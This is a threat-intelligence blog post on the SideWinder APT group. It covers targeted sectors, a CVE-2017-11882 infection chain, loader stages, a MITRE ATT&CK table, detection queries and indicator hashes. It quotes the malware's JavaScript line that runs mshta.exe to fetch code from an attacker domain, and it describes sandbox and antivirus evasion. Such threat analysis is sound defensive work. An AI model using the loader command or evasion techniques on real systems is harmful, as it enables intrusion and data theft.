---
title: "SideWinder APT Groups"

header:
  teaser: /assets/images/APTs/SideWinder/SideWinder.png
  overlay_image: /assets/images/APTs/SideWinder/SideWinder.png
  overlay_filter: 0.5

ribbon: Orange
description: "SideWinder APT Groups"
categories:
  - APTs
tags: 
  - SideWinder APT 
  - SOC


toc: true
toc_sticky: true
toc_label: "On This Blog"
toc_icon: "biohazard"
classes: wide
last_modified_at: 
---
<span style="color: #909090">Category: SideWinder APTs - APTs </span>

<!-- | ![ToddyCat APT](/assets/images/APTs/ToddyAPT/toddy.png) | 
|:--:| 
| *ToddyCat APT Group* | -->

# SideWinder APT Groups

<aside>

SideWinder APT Targets Maritime, Nuclear, and IT Sectors Across Asia, Middle East, and Africa

</aside>

- **Summary**
    
    **SideWinder** APT, operational since 2012, has significantly broadened its scope beyond its initial focus on military and government entities in South Asia. The group has evolved into a highly sophisticated threat actor, now targeting a wide range of sectors including maritime, nuclear, logistics, information technology, and diplomatic infrastructures across Asia, the Middle East, and Africa. This expansion highlights the group's growing operational maturity and strategic intent in pursuing high-value targets globally.
    
    - **Threat Actor Overview**
        
        SideWinder, also referred to as **Baby Elephant**, **Hardcore Nationalist**, **Leafperfora-tor**, **Rattlesnake**, **Razor Tiger**, or **T-APT-04**, has been operational for more than a decade. It operates mainly in South Asia, the Middle East, and Africa.
        
        **Motivations**: The group appears to be driven by **state-sponsored espionage** with geopolitical objectives, targeting key sectors like government, defense, logistics, and energy.
        
    - **Targeted Sectors and Regions (Victims):**
        
        ![***Countries and territories targeted by SideWinder in 2024***](/assets/images/APTs/SideWinder/image.png)
        
        ***Countries and territories targeted by SideWinder in 2024***
        
        - **Sectors:**
            - Nuclear Energy Institutions
            - Maritime Infrastructure
            - IT and Logistics Firms
            - Diplomatic and Government Entities
        - **Regions:**
            - Asia: Pakistan, Nepal, Sri Lanka, Bangladesh
            - **Middle East: United Arab Emirates (UAE), Saudi Arabia**
            - Africa: Kenya, Djibouti
    
## Execution Flow of The Malware
- **Execution Flow of The Malware**
    
    ![*Infection flow*](/assets/images/APTs/SideWinder/image%201.png)
    
    ***Infection flow***
    
    “The attacker sends **spear-phishing** emails with a **DOCX** file attached. The document uses the remote template injection technique to download an RTF file stored on a remote server controlled by the attacker. The file exploits a known vulnerability ([CVE-2017-11882](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2017-11882)) to run a malicious **shellcode** and initiate a multi-level infection process that leads to the installation of malware we have named “**Backdoor Loader**”. This acts as a loader for “**StealerBot**”, a private post-exploitation toolkit used exclusively by SideWinder”.
    
    - **Abnormal Execution Flow (Malicious Behavior) Steps**:
        1. **Email with Malicious Attachment**:
            
            The attacker sends an email containing a malicious attachment (e.g., a .DOCX file). This attachment is designed to exploit vulnerabilities such as [CVE-2017-11882](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2017-11882) (Remote Template Injection).
            
            These campaigns have employed refined **spear-phishing techniques**, leveraged well-known but still effective vulnerabilities such as **CVE-2017-11882**, **CVE-2025-2783**, and deployed bespoke implants designed for stealth and persistence within critical environments
            
        2. **Exploit Triggered**:
            
            When the user opens the document, it triggers an **RTF Exploit**, executing malicious code embedded in the document.
            
        3. **Execution of Malicious Code:**
            
            The exploit leads to the execution of **mshta.exe** (a legitimate Windows system binary) using **LOLBin** (Living off the Land Binary). This binary then runs a **JS script dropper**, which is an unusual behavior not seen in standard operations.
            
        4. **Malware Dropper**:
            
            The **JS script droppe**r deploys multiple malicious components, including **App.dll** and **ModuleInstaller.dll**. These are **Downloader Modules**, designed to fetch and execute further malicious payloads on the system.
            
        5. **Persistence Mechanism**:
            
            To maintain long-term access, the malware creates persistence through techniques such as:
            
            - Modifying the **HKCU Run Registry** value.
            - Scheduling tasks via **Windows Task Scheduler**.
            This ensures the malware persists even after the system is rebooted.
        6. **Downloading Additional Payloads**:
            
            The malware establishes communication with a **C2 (Command and Control) Server** over HTTPS to download additional malicious plugins, including:
            
            - Keyloggers
            - File Stealers
            - Token Grabbers
            - Credential Phishers
        7. **Data Theft**:
            
            These plugins are specifically designed to **steal sensitive information** such as **credentials**, **keystrokes**, and **screenshots** from the infected system.
            
        8. **Additional Components**:
            
            The malware downloads further components, such as **InstallerPayload_NET** and **InstallerPayload.dll**, to continue compromising the system and enable ongoing malicious activities.
            
    
    - **The documents used various themes to deceive victims into believing they are legitimate:**
        
        ![image.png](/assets/images/APTs/SideWinder/image%202.png)
        
        Malicious documents related to nuclear power plants and energy
        
        
        
        ![image.png](/assets/images/APTs/SideWinder/image%203.png)
        
        Malicious documents relating to maritime infrastructures and different port authorities
        
## Technical Details   
- **Technical Details**
    
    ![image.png](/assets/images/APTs/SideWinder/image%204.png)
    
    1. **RTF Exploit**
        - The attacker exploit file contained a **shellcode**, to execute embedded JavaScript code that invokes the `**mshtml.RunHTMLApplication**` function.
        - In this new version:
            - The JavaScript code runs the **`mshta.exe**` Windows utility and retrieves additional malicious code from a remote server:
                
                ```jsx
                **12javascript:eval("var gShZVnyR = new ActiveXObject('WScript.Shell');gShZVnyR.Run('mshta.exehttps://dgtk.depo-govpk[.]com/19263687/trui',0);window.close();")**
                ```
                
            - The updated **shellcode** employs techniques to bypass **sandbox detection** and complicate analysis, slightly different from previous versions:
                - It uses the **`GlobalMemoryStatusEx**` function to check the system's RAM size.
                - It attempts to load **`nlssorting.dll**,` terminating if this operation succeeds.
    2. **JavaScript Loader**
        - Once the **RTF exploit** is triggered, the **`mshta.exe`** utility is used to download a malicious **`HTA**` file from a remote server controlled by the attacker.
        - **`HTA File`**: The HTA file contains an obfuscated **JavaScript** loader, which loads additional malware, called the **Downloader Module**, into memory.
            
            ```jsx
            mshta.exe hxxps://dgtk.depo-govpk[.]com/19263687/trui
            ```
            
        - The **JavaScript loader** operates in two stages:
            1. **First Stage:**
                - It decodes and loads several strings (initially encoded with a substitution algorithm) stored as variables.
                - It checks the system's **RAM size** and terminates if the size is less than **950 MB**.
                - If the RAM size is sufficient, the loader proceeds to the next stage.
            2. **Second Stage:**
                - It enumerates subfolders under **`Windows%\Microsoft.NET\Framework\`** to identify the installed **.NET framework version**.
                - It configures the **`COMPLUS_Version`** environment variable based on the detected .NET version.
                - The loader then decodes and loads the **Downloader Module**, which is embedded as a **base64-encoded .NET serialized stream**.
    3. **Downloader Modules**
        - The **Downloader Module** is a **.NET library** used to gather information about the system's security software and download another component called the **Module Installer.**
        - The new version of **`app.dll`** (Downloader Module) improves the function used to detect security software:
            - The previous version simply used **WMI queries** to list installed security products.
            - The updated version uses a more **advanced WMI query** that retrieves the **antivirus name** and its **product state**.
            - The malware checks running processes and compares them against an embedded dictionary containing 137 process names related to popular security software.
            - The WMI query is executed only when no Kaspersky processes are running on the system.
    4. **Backdoor Loader**
        - The infection chain ends with the installation of the **Backdoor Loader**, which is used to load the **StealerBot** implant into memory.
        - **Backdoor Loader**: A legitimate, signed application is hijacked to load the **Backdoor Loader** library, which then loads **StealerBot**.
        - In recent campaigns, attackers have diversified the **Backdoor Loader** samples, using several new variants to avoid detection:
            - **Previous variants**: `propsys.dll`, `vsstrace.dll`
            - **New variants**: `JetCfg.dll`, `policymanager.dll`, `winmm.dll`, `xmllite.dll`, `dcntel.dll`, `UxTheme.dll`
        - The new malware versions incorporate enhanced anti-analysis techniques and employ **Control Flow Flattening** to avoid detection.
        - Additionally, a **new C++ version** of the **Backdoor Loader** has been discovered:
            - The logic of the C++ version is similar to the .NET versions, but it lacks the anti-analysis techniques.
            - These C++ variants were tailored for specific targets and were likely deployed manually after the infection phase, with each variant configured to load the second stage from a specific file path.
                
                ```jsx
                C:\Users\[REDACTED]\AppData\Roaming\valgrind\[REDACTED FILE NAME].[REDACTED EXTENSION]
                ```
                
            - This indicates that the malware was manually deployed by the attacker after confirming the victim’s identity, using compromised infrastructure.

## Tactics, Techniques and Procedures
- **Tactics, Techniques and Procedures**
    
    The following TTPs have been observed in relation to SideWinder APT campaign :
    
    | Tactic | Technique | Description | MITRE ATT&CK ID |
    | --- | --- | --- | --- |
    | Initial Access | Spear Phishing Attachment | Delivers weaponised .LNK, .INF, and .DLL files via ZIP archives themed to victim interests | T1566.001 |
    | Execution | DLL Sideloading | Abuses signed, legitimate applications to sideload malicious DLLs | T1574.002 |
    | Execution | User Execution | Relies on user opening ZIP or launching shortcut file | T1204.002 |
    | Defense Evasion | Obfuscated Files or Information | Uses malformed ZIPs and obfuscation of payloads to bypass scanning | T1027 |
    | Defense Evasion | In-Memory Execution | Loads payloads like StealerBot entirely in memory, avoiding disk artefacts | T1055.012 |
    | Defense Evasion | Virtualisation/Sandbox Evasion | Detects sandboxed or virtual environments based on RAM size, uncommon DLLs, or known analysis processes | T1497.001 |
    | Persistence | DLL Search Order Hijacking | Drops malicious DLLs into trusted directories to hijack legitimate app loading paths | T1574.001 |
    | Command and Control | Application Layer Protocol | Uses HTTP(S)-based C2 via custom or masqueraded domains | T1071.001 |
    | Command and Control | Custom C2 Protocol | Employs a custom C2 protocol used by StealerBot to exfiltrate info and receive tasks | T1095 |
    | Discovery | System Information Discovery | Collects host details such as usernames, OS version, RAM, running processes | T1082 |
    | Collection | Clipboard Data | StealerBot accesses clipboard data to capture sensitive information | T1115 |
    | Collection | Browser Credential Dumping | Captures stored passwords and cookies from browsers | T1555.003 |
    | Collection | Screenshot Capture | Takes desktop screenshots for context gathering | T1113 |
    | Exfiltration | Exfiltration Over C2 Channel | Sends collected data back over custom C2 or HTTP(S) channels | T1041 |
    | Exfiltration | Automated Exfiltration | Periodically exfiltrates data without user interaction | T1020 |

## Exploited Vulnerabilities
- **Exploited Vulnerabilities**
    
    
    | Vulnerability | CVE | Versions Impacted | Description | Exploitation |
    | --- | --- | --- | --- | --- |
    | Microsoft Equation Editor | CVE-2017-11882 | Microsoft Office 2007, 2010, 2013, 2016, and 2019 (and Office 365) - All versions with Equation Editor enabled | Vulnerability in Microsoft Office's Equation Editor, allowing remote code execution through specially crafted documents. | Used in spear-phishing emails with malicious Office documents. |

## Detection Rules
- **Detection Rules**
    1. **Detect the Backdoor Loader** 
        - **Log Source**: Windows Event Logs (Process Creation), File System Logs
            
            ```jsx
            {
              "query": "event.category:process and (process.name:propsys.dll or process.name:vsstrace.dll or process.name:JetCfg.dll or process.name:policymanager.dll or process.name:winmm.dll or process.name:xmllite.dll or process.name:dcntel.dll or process.name:UxTheme.dll) and file.size < 500KB",
              "description": "Detects Backdoor Loader activity based on file names and size.",
              "severity": "high",
              "tags": ["malicious", "backdoor_loader", "sidewinder_apt"]
            }
            ```
            
        - **Condition**: Detects files related to **propsys.dll**, **vsstrace.dll**, **JetCfg.dll**, **policymanager.dll**, **winmm.dll**, **xmllite.dll**, **dcntel.dll**, **UxTheme.dll** (less than 500KB).
    2. **Detect the Downloader Module**
        - **Log Source**: Windows Event Logs (Process Creation), File System Logs
            
            ```jsx
            {
              "query": "event.category:process and (process.name:app.dll or process.args:*WScript.Shell* or process.args:*COMPLUS_Version* or process.args:*base64-encoded .NET serialized stream*) and file.size < 200KB",
              "description": "Detects Downloader Module activity based on known indicators.",
              "severity": "high",
              "tags": ["malicious", "downloader_module", "sidewinder_apt"]
            }
            ```
            
        - **Condition**: Detects files related to **app.dll**, **WScript.Shell**, **COMPLUS_Version**, or **base64-encoded .NET serialized stream** (less than 200KB).
    3. **Detect the JavaScript Loader**
        - **Log Source**: Web Application Logs, Browser Activity Logs
            
            ```jsx
            {
              "query": "event.category:web and message:eval and message:mshta.exe and message:dgtk.depo-govpk and file.size < 150KB",
              "description": "Detects JavaScript loader execution that invokes mshta.exe with a suspicious URL.",
              "severity": "high",
              "tags": ["malicious", "javascript_loader", "sidewinder_apt"]
            }
            ```
            
        - **Condition**: Detects **`eval()`** execution that includes **mshta.exe** and suspicious URLs (less than 150KB).
    4. **Detect the RTF Exploit**
        - **Log Source**: Windows Event Logs (Application), File System Logs
            
            ```jsx
            {
              "query": "event.category:process and (process.args:CVE-2017-11882 or process.args:mshta.exe or process.args:javascript:eval) and file.size < 100KB",
              "description": "Detects the execution of RTF Exploit commonly used in spear-phishing attacks.",
              "severity": "high",
              "tags": ["malicious", "rtf_exploit", "sidewinder_apt"]
            }
            ```
            
        - **Condition**: Detects **CVE-2017-11882** exploit triggering **mshta.exe** or JavaScript (`eval()`).
    5. **Detect APP.DLL Malware**
        - **Log Source**: Windows Event Logs (Process Creation)
            
            ```jsx
            {
              "query": "event.category:process and (process.name:app.dll) and (process.args:mshta.exe or process.args:pcalua.exe) and process.path:%TEMP%\\ and file.size < 200KB",
              "description": "Detects APP.DLL malware behavior used for AV bypass.",
              "severity": "high",
              "tags": ["malicious", "app_dll", "av_bypass"]
            }
            ```
            
        - **Condition**: Detects **APP.DLL** executed with **mshta.exe** or **pcalua.exe** and suspicious payload locations (`%TEMP%\`).
    6. **Detect Infection Vectors (Spear-Phishing and RTF)**
        - **Log Source**: Email Logs, Web Application Logs
            
            ```jsx
            {
              "query": "event.category:email and (message:*freelance video game developer* or message:*renting a car in Bulgaria* or message:*nuclear power plants* or message:*maritime infrastructures* or message:*CVE-2017-11882*) and file.size < 200KB",
              "description": "Detects spear-phishing and RTF-based infection vectors in email communications.",
              "severity": "high",
              "tags": ["malicious", "spear_phishing", "infection_vector"]
            }
            ```
            
        - **Condition**: Detects suspicious email contents like **nuclear power plants**, **maritime infrastructures**, or **CVE-2017-11882** references.
    7. **Detecting SideWinder Infrastructure**
        - **Log Source**: Network Logs, DNS Logs
            
            ```jsx
            {
              "query": "event.category:network and (network.destination.domain:nextgen.paknavy-govpk.net or network.destination.domain:premier.moittpk.org or network.destination.domain:cabinet-division-pk.fia-gov.com or network.destination.domain:navy-lk.direct888.net or network.destination.domain:srilanka-navy.lforvk.com) and file.size < 150KB",
              "description": "Detects suspicious network traffic to known SideWinder infrastructure domains.",
              "severity": "high",
              "tags": ["malicious", "sidewinder_infrastructure", "network"]
            }
            ```
            
        - **Condition**: Detects connections to **SideWinder** infrastructure domains like `nextgen.paknavy-govpk.net`, `premier.moittpk.org`, etc.

## Indicators of compromise (IoCs)
- **Indicators of compromise (IoCs)**
    - [https://github.com/RedDrip7/APT_Digital_Weapon/blob/master/Sidewinder/Sidewinder_hash.md](https://github.com/RedDrip7/APT_Digital_Weapon/blob/master/Sidewinder/Sidewinder_hash.md)
    - **Backdoor Loader:**
        
        
        | **Hash** | **Type** | **First_Seen** | **Name** |
        | --- | --- | --- | --- |
        | [0216ffc6fb679bdf4ea6ee7051213c1e](https://www.virustotal.com/gui/file/5740947bb9267e1be8281edc31b3fb2d57a71d2c96a47eeeaa6482c0927aa6a4) | Win32 DLL  | 2025-03-11 14:27:55 UTC | - |
        | [433480f7d8642076a8b3793948da5efe](https://www.virustotal.com/gui/file/44ff1117bb0167f85d599236892deede636c358df3d8908582a6ce6a48070bd4) | Win32 DLL  | 2025-03-11 14:27:51 UTC | vsstrace.dll |
    - **Microsoft Office Documents:**
        
        
        | **Hash** | **Type** | **First_Seen** | **Name** |
        | --- | --- | --- | --- |
        | [e9726519487ba9e4e5589a8a5ec2f933](https://www.virustotal.com/gui/file/d9e373aeea5fe0c744f0de94fdd366b5b6da816209ac394cbbda1c64c03b50b1) | Rich Text Format (RTF) | 2025-03-11 14:27:52 UTC | - |
        | [d36a67468d01c4cb789cd6794fb8bc70](https://www.virustotal.com/gui/file/865f5b3b1ee94d89ad9a9840f49a17d477cddfc3742c5ef78d77a6027ad1caa5) | Office Open XML Document  | 2024-10-22 12:00:00 UTC | Instructions.docx |
        | [313f9bbe6dac3edc09fe9ac081950673](https://www.virustotal.com/gui/file/fa95fadc73e5617305a6b71f77e9d255d14402650075107f2272f131d3cf7b00) | Office Open XML Document  | 2024-10-17 23:57:24 UTC | 84154062.exe |
        | [bd8043127abe3f5cfa61bd2174f54c60](https://www.virustotal.com/gui/file/aacaf712cf67176f159657be2fbd0fce018aa03b890cb1616b146eddb1de73be) | Office Open XML Document  | 2024-07-26 13:03:50 UTC | mal.doc |
        | [e0bce049c71bc81afe172cd30be4d2b7](https://www.virustotal.com/gui/file/512a83f1a6c404cb0ba679c7a2f3aa782bb5e17840d31a034de233f7500a6cb9) | Office Open XML Document  | 2024-07-05 14:39:25 UTC | 512a83f1a6c404cb0ba679c7a2f3aa782bb5e17840d31a034de233f7500a6cb9.doc |
        | [3d9961991e7ae6ad2bae09c475a1bce8](https://www.virustotal.com/gui/file/a84b3dd5f7d29d8d257fdef0ede512ae09e6cd5be7681b9466a5c60f6f877c2b) | Office Open XML Document  | 2024-08-12 13:11:09 UTC | 3d9961991e7ae6ad2bae09c475a1bce8.docx |

## References
- **References**
    - [https://thehackernews.com/2025/03/sidewinder-apt-targets-maritime-nuclear.html](https://thehackernews.com/2025/03/sidewinder-apt-targets-maritime-nuclear.html)
    - [https://securelist.com/sidewinder-apt-updates-its-toolset-and-targets-nuclear-sector/115847/](https://securelist.com/sidewinder-apt-updates-its-toolset-and-targets-nuclear-sector/115847/)
    - [https://www.hacking.reviews/2024/10/sidewinder-apt-strikes-middle-east-and.html](https://www.hacking.reviews/2024/10/sidewinder-apt-strikes-middle-east-and.html)
    - [https://gbhackers.com/sidewinder-apt-deploys-new-tools-in-attacks/](https://gbhackers.com/sidewinder-apt-deploys-new-tools-in-attacks/)
    - [https://www.seqrite.com/blog/operation-sidecopy/](https://www.seqrite.com/blog/operation-sidecopy/)
    - [https://blog.kowatek.com/2024/10/17/sidewinder-apt-strikes-middle-east-and-africa-with-stealthy-multi-stage-attack/](https://blog.kowatek.com/2024/10/17/sidewinder-apt-strikes-middle-east-and-africa-with-stealthy-multi-stage-attack/)
    - [https://rhisac.org/threat-intelligence/sidewinder-apt-targets-hospitality-entities-across-asia-middle-east-europe-and-africa/](https://rhisac.org/threat-intelligence/sidewinder-apt-targets-hospitality-entities-across-asia-middle-east-europe-and-africa/)
    - [https://attack.mitre.org/groups/G0121/](https://attack.mitre.org/groups/G0121/)
    - [https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Indian/APT/SideWinder/25-12-19/analysis.md](https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Indian/APT/SideWinder/25-12-19/analysis.md)